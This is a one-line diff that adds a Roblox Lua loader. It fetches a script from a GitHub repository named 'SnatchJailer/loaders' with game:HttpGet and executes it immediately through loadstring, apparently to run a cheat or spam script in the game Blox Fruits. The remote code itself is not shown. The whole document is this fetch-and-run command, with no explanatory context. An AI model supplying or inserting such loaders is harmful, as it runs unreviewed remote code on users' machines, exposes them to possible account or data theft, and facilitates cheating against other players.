@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SnatchJailer/loaders/main/loaders/blox-fruits-spam5-a0wcw7vihxlkig.lua"))()
